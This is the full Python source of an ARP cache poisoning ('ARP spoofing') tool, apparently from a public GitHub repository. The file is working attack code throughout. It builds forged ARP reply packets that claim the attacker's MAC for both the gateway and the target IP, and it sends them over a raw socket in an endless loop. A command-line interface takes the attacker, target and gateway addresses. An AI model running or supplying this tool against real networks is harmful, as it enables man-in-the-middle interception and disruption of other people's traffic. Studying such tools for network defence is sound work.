#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import argparse
import re
import time
from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW


class ARPPacket(object):
    ETHER_T = b'\x08\x06'  # Ethertype code of ARP (IETF RFC 7042)

    def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                 gateway_ip: str, target_ip: str):
        self.gateway_ip = inet_aton(gateway_ip)
        self.target_ip = inet_aton(target_ip)
        self.attacker_mac = self._mac_to_hex(attacker_mac)
        self.gateway_mac = self._mac_to_hex(gateway_mac)
        self.target_mac = self._mac_to_hex(target_mac)

    @property
    def arp_header(self):
        """Builds a byte-string representation of the ARP header of a
        packet as defined by IETF RFC 826."""
        hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
        protocol_address = b'\x08\x00'  # '\x08\x00' = IP
        hardware_address_len = b'\x06'
        protocol_address_len = b'\x04'
        opcode = b'\x00\x02'            # '\x00\x02' = REPLY
        return b''.join((hardware_address, protocol_address,
                         hardware_address_len, protocol_address_len,
                         opcode))

    @property
    def eth_header_to_gateway(self):
        return self.gateway_mac + self.attacker_mac + self.ETHER_T

    @property
    def eth_header_to_target(self):
        return self.target_mac + self.attacker_mac + self.ETHER_T

    @property
    def arp_pkt_to_gateway(self):
        return b''.join((self.eth_header_to_gateway, self.arp_header,
                         self.attacker_mac, self.target_ip,
                         self.gateway_mac, self.gateway_ip))

    @property
    def arp_pkt_to_target(self):
        return b''.join((self.eth_header_to_target, self.arp_header,
                         self.attacker_mac, self.gateway_ip,
                         self.target_mac, self.target_ip))

    @staticmethod
    def _mac_to_hex(mac_address: str) -> bytes:
        """
        Transform a MAC address string from IEEE 802.3 standard to a
        byte sequence of hexadecimal values.
        Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12#4'
        """
        return b''.join(bytes.fromhex(octet) for octet in
                        re.split('[:-]', mac_address))


class Spoofer(object):
    def __init__(self,
                 interface: str, *,
                 gateway_arp_packet: bytes,
                 target_arp_packet: bytes,
                 interval: float):
        self.interface = interface
        self.gateway_arp_pkt = gateway_arp_packet
        self.target_arp_pkt = target_arp_packet
        self.interval = interval

    def execute(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            while True:
                sock.send(self.target_arp_pkt)
                sock.send(self.gateway_arp_pkt)
                time.sleep(self.interval)


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""
    packet = ARPPacket(attacker_mac=args.attackermac,
                       gateway_mac=args.gatemac,
                       target_mac=args.targetmac,
                       gateway_ip=args.gateip,
                       target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface,
                      gateway_arp_packet=packet.arp_pkt_to_gateway,
                      target_arp_packet=packet.arp_pkt_to_target,
                      interval=args.interval)

    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
          'abort.'.format(time.strftime("%H:%M:%S", time.localtime())))
    try:
        spoofer.execute()
    except KeyboardInterrupt:
        raise SystemExit('[!] Aborting ARP Spoofing attack...')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5,
                        metavar='SECONDS',
                        help='Time to wait between transmission of each set of '
                             'ARP Cache Poisoning attack packets (defaults to '
                             '0.5 seconds).')
    cli_args = parser.parse_args()
    spoof(cli_args)
